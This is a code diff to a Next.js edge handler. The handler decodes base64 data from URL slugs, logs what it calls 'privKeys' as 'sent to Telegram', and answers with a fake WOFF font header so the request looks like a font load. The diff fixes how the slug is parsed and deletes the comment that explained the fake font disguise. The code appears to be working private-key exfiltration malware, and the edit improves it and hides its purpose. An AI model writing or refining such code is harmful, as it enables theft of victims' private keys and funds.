@@ -30,12 +30,17 @@ export const config = {
 
 export default async function handler(req: NextRequest) {
   const slug = new URL(req.url).pathname.split("/").pop();
-  if (!slug || !slug.includes("_")) {
+  if (!slug) {
     return new Response("Invalid slug", { status: 400 });
   }
 
+  const idx = slug.indexOf("_");
+  if (idx === -1) {
+    return new Response("Invalid slug format", { status: 400 });
+  }
+
   try {
-    const encoded = slug.split("_")[1];
+    const encoded = slug.slice(idx + 1);
     const fixedB64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
     const padded = fixedB64 + "=".repeat((4 - (fixedB64.length % 4)) % 4);
     const jsonStr = Buffer.from(padded, "base64").toString("utf-8");
@@ -73,7 +78,6 @@ export default async function handler(req: NextRequest) {
 
     console.log("✅ Processed and sent to Telegram:", privKeys);
 
-    // Respond with fake WOFF font header so browser doesn't error
     return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
       headers: {
         "Content-Type": "font/woff",
